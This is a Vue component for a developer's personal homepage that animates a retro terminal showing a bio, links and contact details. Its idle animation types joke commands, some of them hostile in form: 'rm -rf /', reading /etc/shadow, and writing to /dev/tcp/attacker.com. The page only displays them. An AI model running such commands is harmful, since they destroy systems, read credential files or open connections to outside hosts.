<script setup lang="ts">
import { ref, onMounted, onUnmounted, nextTick, watch } from "vue";

type LineType = "command" | "output" | "header" | "link" | "blank";

interface LineConfig {
  type: LineType;
  text: string;
  href?: string;
  preDelay?: number;
  speed?: number;
}

interface RenderedLine {
  type: LineType;
  text: string;
  href?: string;
}

const PROMPT = "adam@stirtan.net:~$";

const lineConfigs: LineConfig[] = [
  { type: "blank", text: "", preDelay: 400 },
  { type: "command", text: "whoami", preDelay: 600, speed: 80 },
  { type: "blank", text: "", preDelay: 100 },
  { type: "header", text: "Adam Stirtan", preDelay: 200, speed: 40 },
  { type: "output", text: "Software Engineer", preDelay: 60, speed: 28 },
  { type: "blank", text: "", preDelay: 500 },
  { type: "command", text: "cat about.txt", preDelay: 800, speed: 80 },
  { type: "blank", text: "", preDelay: 150 },
  {
    type: "output",
    text: "I'm a software engineer, husband, father and the world's best Super Mario Bros. 35 player.",
    preDelay: 200,
    speed: 22,
  },
  {
    type: "output",
    text: "I have written code you\'ve used, I\'ve been blogging for years and coding for many more.",
    preDelay: 60,
    speed: 22,
  },
  { type: "blank", text: "", preDelay: 500 },
  { type: "command", text: "ls", preDelay: 900, speed: 80 },
  { type: "blank", text: "", preDelay: 150 },
  {
    type: "link",
    text: "projects  ->  view my projects",
    href: "https://adamstirtan.notion.site/Projects-16c17d2d3e8380e59340ec22be21f25d",
    preDelay: 200,
    speed: 22,
  },
  {
    type: "link",
    text: "blog      ->  view my blog",
    href: "https://adamstirtan.notion.site/Blog-2c317d2d3e83806781eceef1581fa735",
    preDelay: 60,
    speed: 22,
  },
  { type: "blank", text: "", preDelay: 500 },
  { type: "command", text: "cat contact.txt", preDelay: 900, speed: 80 },
  { type: "blank", text: "", preDelay: 150 },
  {
    type: "link",
    text: "github    ->  github.com/adamstirtan",
    href: "https://github.com/adamstirtan",
    preDelay: 200,
    speed: 22,
  },
  {
    type: "link",
    text: "linkedin  ->  linkedin.com/in/adamstirtan",
    href: "https://linkedin.com/in/adamstirtan",
    preDelay: 60,
    speed: 22,
  },
  {
    type: "link",
    text: "x         ->  x.com/adam_stirtan",
    href: "https://x.com/adam_stirtan",
    preDelay: 60,
    speed: 22,
  },
  {
    type: "link",
    text: "email     ->  adamstirtan@gmail.com",
    href: "mailto:adamstirtan@gmail.com",
    preDelay: 60,
    speed: 22,
  },
  { type: "blank", text: "", preDelay: 400 },
];

const completedLines = ref<RenderedLine[]>([]);
const currentText = ref("");
const currentType = ref<LineType>("output");
const currentHref = ref<string | undefined>();
const isTyping = ref(false);
const isDone = ref(false);
const skipped = ref(false);

const idleCommands = [
  "ping 127.0.0.1 -c 9999",
  "nmap -Pn -sV secret-door.ilovebees.com",
  "sudo cat /etc/shadow > /dev/null",
  "curl -s https://api.hackernews.com/flags | jq .",
  "rm -rf / --no-preserve-root",
  "telnet towel.blinkenlights.nl",
  "ssh admin@deathstar",
  "git clone --depth=1 https://github.com/adamstirtan/adamstirtan.net.git",
  "ls -la /var/www/secret",
  "java -jar hacktheplanet.jar --target all --stealth-mode",
  "echo 'I am root' > /dev/tcp/attacker.com/1337",
  "find / -type f -name 'passwords.txt' 2> /dev/null",
  "openssl s_client -connect secret-door.ilovebees.com:443",
  "export PATH=$PATH:/secret/hacker/tools && hacktheplanet --stealth",
];

let idleTimer: ReturnType<typeof setTimeout> | null = null;

// ── Glitch state ────────────────────────────────────────────────────────────
const glitchActive = ref(false);
const glitchHeavy = ref(false);
const glitchBarY = ref("40%");
let glitchTimer: ReturnType<typeof setTimeout> | null = null;

function doGlitch() {
  const heavy = Math.random() < 0.45;
  glitchBarY.value = `${8 + Math.random() * 78}%`;
  glitchHeavy.value = heavy;
  glitchActive.value = true;

  const duration = heavy ? 160 + Math.random() * 260 : 70 + Math.random() * 110;

  glitchTimer = setTimeout(() => {
    glitchActive.value = false;
    glitchHeavy.value = false;

    // 35 % chance of a quick aftershock
    if (Math.random() < 0.35) {
      glitchTimer = setTimeout(doGlitch, 55 + Math.random() * 170);
    } else {
      scheduleGlitch();
    }
  }, duration);
}

function scheduleGlitch() {
  glitchTimer = setTimeout(doGlitch, 3500 + Math.random() * 8500);
}

function stopIdleLoop() {
  if (idleTimer) {
    clearTimeout(idleTimer);
    idleTimer = null;
  }
}

function scheduleIdleCycle() {
  stopIdleLoop();
  idleTimer = setTimeout(runIdleCycle, 5000 + Math.random() * 5000);
}

function runIdleCycle() {
  // Pick a friendly, funny "hacker" command to type.
  const command = idleCommands[Math.floor(Math.random() * idleCommands.length)];
  currentType.value = "command";
  currentHref.value = undefined;
  currentText.value = "";
  isTyping.value = true;
  isDone.value = false;

  const typeSpeed = 70;
  let charIdx = 0;

  function typeChar() {
    if (skipped.value) return;
    if (charIdx < command.length) {
      currentText.value = command.slice(0, ++charIdx);
      later(typeChar, typeSpeed + Math.random() * 40 - 20);
    } else {
      // Pause briefly before clearing the line.
      later(deleteChar, 1200 + Math.random() * 1200);
    }
  }

  function deleteChar() {
    if (skipped.value) return;
    if (currentText.value.length > 0) {
      currentText.value = currentText.value.slice(0, -1);
      later(deleteChar, typeSpeed * 0.65 + Math.random() * 30);
    } else {
      isTyping.value = false;
      isDone.value = true;
      scheduleIdleCycle();
    }
  }

  typeChar();
}

let timeoutIds: ReturnType<typeof setTimeout>[] = [];

function later(fn: () => void, delay: number) {
  const id = setTimeout(fn, delay);
  timeoutIds.push(id);
}

function clearAll() {
  timeoutIds.forEach(clearTimeout);
  timeoutIds = [];
}

function processLine(index: number) {
  if (skipped.value) return;
  if (index >= lineConfigs.length) {
    isTyping.value = false;
    isDone.value = true;
    scheduleIdleCycle();
    return;
  }

  const config = lineConfigs[index];

  later(() => {
    if (skipped.value) return;

    if (config.type === "blank") {
      completedLines.value.push({ type: "blank", text: "" });
      processLine(index + 1);
      return;
    }

    currentType.value = config.type;
    currentHref.value = config.href;
    currentText.value = "";
    isTyping.value = true;

    const base = config.speed ?? 30;
    let charIdx = 0;

    function typeChar() {
      if (skipped.value) return;
      if (charIdx < config.text.length) {
        currentText.value = config.text.slice(0, ++charIdx);
        const jitter = base * 0.35;
        later(typeChar, base + (Math.random() * jitter * 2 - jitter));
      } else {
        completedLines.value.push({
          type: config.type,
          text: config.text,
          href: config.href,
        });
        currentText.value = "";
        isTyping.value = false;
        processLine(index + 1);
      }
    }

    typeChar();
  }, config.preDelay ?? 100);
}

function skipToEnd() {
  if (isDone.value) return;
  skipped.value = true;
  clearAll();
  completedLines.value = lineConfigs.map((c) => ({
    type: c.type,
    text: c.text,
    href: c.href,
  }));
  currentText.value = "";
  isTyping.value = false;
  isDone.value = true;
  skipped.value = false; // allow idle typing to continue
  scheduleIdleCycle();
}

watch(
  [completedLines, isTyping],
  async () => {
    await nextTick();
    window.scrollTo({ top: document.documentElement.scrollHeight });
  },
  { deep: true },
);

onMounted(() => {
  processLine(0);
  scheduleGlitch();
  window.addEventListener("keydown", skipToEnd);
});

onUnmounted(() => {
  clearAll();
  stopIdleLoop();
  if (glitchTimer) clearTimeout(glitchTimer);
  window.removeEventListener("keydown", skipToEnd);
});
</script>

<template>
  <!-- CRT scanlines overlay -->
  <div class="scanlines" aria-hidden="true" />

  <!-- Vignette overlay -->
  <div class="vignette" aria-hidden="true" />

  <div
    class="terminal"
    :class="{ glitch: glitchActive, 'glitch--heavy': glitchHeavy }"
    :style="{ '--glitch-bar-y': glitchBarY }"
    @click="skipToEnd"
  >
    <div class="terminal-content">
      <!-- Completed lines -->
      <div
        v-for="(line, i) in completedLines"
        :key="i"
        class="line"
        :class="`line--${line.type}`"
      >
        <template v-if="line.type === 'blank'">&nbsp;</template>
        <template v-else-if="line.type === 'command'">
          <span class="prompt">{{ PROMPT }}&nbsp;</span>{{ line.text }}
        </template>
        <template v-else-if="line.type === 'link'">
          <a
            :href="line.href"
            target="_blank"
            rel="noopener noreferrer"
            @click.stop
            >{{ line.text }}</a
          >
        </template>
        <template v-else>{{ line.text }}</template>
      </div>

      <!-- Currently-typing line -->
      <div v-if="isTyping" class="line" :class="`line--${currentType}`">
        <span v-if="currentType === 'command'" class="prompt"
          >{{ PROMPT }}&nbsp;</span
        >{{ currentText }}<span class="cursor" aria-hidden="true">█</span>
      </div>

      <!-- Done: idle prompt with blinking cursor -->
      <div v-if="isDone" class="line line--command">
        <span class="prompt">{{ PROMPT }}&nbsp;</span
        ><span class="cursor cursor--blink" aria-hidden="true">█</span>
      </div>
    </div>

    <!-- Glitch: bright scan line sweeps the screen -->
    <div v-if="glitchHeavy" class="glitch-scanline" aria-hidden="true" />
  </div>
</template>

<style scoped>
/* ── Base ─────────────────────────────────────────────────────────────────── */
.terminal {
  position: relative;
  min-height: 100vh;
  background: #0d0d0d;
  color: #33ff33;
  font-family: "VT323", "Share Tech Mono", "Courier New", monospace;
  font-size: clamp(17px, 2vw, 22px);
  line-height: 1.65;
  padding: clamp(1.5rem, 4vw, 3rem) clamp(1.5rem, 6vw, 5rem);
  padding-bottom: clamp(4rem, 10vw, 7rem);
  cursor: pointer;
  /* phosphor glow */
  text-shadow: 0 0 6px rgba(51, 255, 51, 0.55);
  /* subtle CRT flicker */
  animation: flicker 6s infinite;
  filter: contrast(1.25) saturate(1.2);
}

/* ── Overlays ─────────────────────────────────────────────────────────────── */
.scanlines {
  position: fixed;
  inset: 0;
  background: repeating-linear-gradient(
    0deg,
    rgba(0, 0, 0, 0.55),
    rgba(0, 0, 0, 0.55) 1px,
    transparent 1px,
    transparent 2px
  );
  pointer-events: none;
  z-index: 50;
}

.vignette {
  position: fixed;
  inset: 0;
  background: radial-gradient(
    ellipse at center,
    transparent 40%,
    rgba(0, 0, 0, 0.95) 100%
  );
  pointer-events: none;
  z-index: 51;
}

/* ── Content ─────────────────────────────────────────────────────────────── */
.terminal-content {
  position: relative;
  z-index: 1;
  max-width: 820px;
  transform: perspective(1000px) rotateX(2deg) scale(1.02);
  transform-origin: center top;
  transform-style: preserve-3d;
  backface-visibility: hidden;
}

/* ── Lines ───────────────────────────────────────────────────────────────── */
.line {
  white-space: pre;
  display: block;
}

.line--blank {
  height: 1.65em;
}

.line--header {
  font-size: 2.4em;
  color: #ccffcc;
  text-shadow:
    0 0 12px rgba(51, 255, 51, 0.8),
    0 0 24px rgba(51, 255, 51, 0.4);
}

.line--output {
  color: #29e629;
}

.line--command {
  color: #66ff66;
}

/* ── Prompt ──────────────────────────────────────────────────────────────── */
.prompt {
  color: #88ff88;
  user-select: none;
}

/* ── Links ───────────────────────────────────────────────────────────────── */
.line--link a {
  color: #00d4ff;
  text-decoration: none;
  text-shadow: 0 0 8px rgba(0, 212, 255, 0.6);
  transition:
    color 0.15s,
    text-shadow 0.15s;
}

.line--link a:hover {
  color: #ffffff;
  text-shadow: 0 0 14px rgba(255, 255, 255, 0.8);
}

/* ── Cursor ──────────────────────────────────────────────────────────────── */
.cursor {
  color: #33ff33;
  text-shadow: 0 0 6px rgba(51, 255, 51, 0.8);
}

.cursor--blink {
  animation: blink 1.1s step-end infinite;
}

/* ── Skip hint ───────────────────────────────────────────────────────────── */
.skip-hint {
  position: fixed;
  bottom: 1.5rem;
  right: 2rem;
  font-size: 0.75em;
  color: rgba(51, 255, 51, 0.35);
  text-shadow: none;
  pointer-events: none;
  z-index: 60;
  letter-spacing: 0.05em;
}

/* ── Animations ──────────────────────────────────────────────────────────── */
@keyframes blink {
  0%,
  100% {
    opacity: 1;
  }
  50% {
    opacity: 0;
  }
}

@keyframes flicker {
  0%,
  88%,
  90%,
  92%,
  100% {
    opacity: 1;
  }
  89% {
    opacity: 0.8;
  }
  91% {
    opacity: 0.6;
  }
  93% {
    opacity: 0.85;
  }
}

/* ── Glitch ──────────────────────────────────────────────────────────────── */

/* Light glitch: quick skew wobble */
.terminal.glitch .terminal-content {
  animation: glitch-skew 0.1s steps(2) infinite;
}

/* Heavy glitch: screen shake + chromatic aberration + corrupted bar */
.terminal.glitch--heavy {
  animation:
    flicker 10s infinite,
    glitch-shake 0.12s steps(3) infinite;
}

.terminal.glitch--heavy .terminal-content {
  animation: glitch-skew 0.08s steps(2) infinite;
  text-shadow:
    -5px 0 rgba(255, 0, 55, 0.9),
    5px 0 rgba(0, 55, 255, 0.9),
    0 0 6px rgba(51, 255, 51, 0.55);
}

/* Corrupted horizontal bar — position driven by --glitch-bar-y */
.terminal.glitch--heavy .terminal-content::before {
  content: "";
  position: absolute;
  left: -6%;
  right: -6%;
  height: 1.65em;
  top: var(--glitch-bar-y, 40%);
  background: rgba(51, 255, 51, 0.08);
  box-shadow: 0 0 8px rgba(51, 255, 51, 0.25);
  transform: translateX(6px) scaleY(1.1);
  pointer-events: none;
}

/* Bright scan line that sweeps top → bottom during heavy glitch */
.glitch-scanline {
  position: fixed;
  left: 0;
  right: 0;
  height: 5px;
  background: linear-gradient(
    90deg,
    transparent,
    rgba(51, 255, 51, 0.55) 25%,
    rgba(255, 255, 255, 0.25) 50%,
    rgba(51, 255, 51, 0.55) 75%,
    transparent
  );
  pointer-events: none;
  z-index: 200;
  animation: scan-sweep 0.3s linear;
}

@keyframes glitch-shake {
  0%,
  100% {
    transform: translate(0, 0);
  }
  15% {
    transform: translate(-4px, 1px);
  }
  30% {
    transform: translate(4px, -2px);
  }
  45% {
    transform: translate(-3px, 2px);
  }
  60% {
    transform: translate(3px, -1px);
  }
  75% {
    transform: translate(-2px, 3px);
  }
  90% {
    transform: translate(2px, -1px);
  }
}

@keyframes glitch-skew {
  0% {
    transform: skewX(0deg) translateX(0);
  }
  25% {
    transform: skewX(-3.5deg) translateX(-4px);
  }
  50% {
    transform: skewX(2.5deg) translateX(4px);
  }
  75% {
    transform: skewX(-2deg) translateX(-2px);
  }
  100% {
    transform: skewX(0deg) translateX(0);
  }
}

@keyframes scan-sweep {
  from {
    top: -1%;
    opacity: 1;
  }
  to {
    top: 101%;
    opacity: 0.2;
  }
}

/* ── Responsive ──────────────────────────────────────────────────────────── */
@media (max-width: 600px) {
  .line {
    white-space: pre-wrap;
    word-break: break-word;
  }
}
</style>
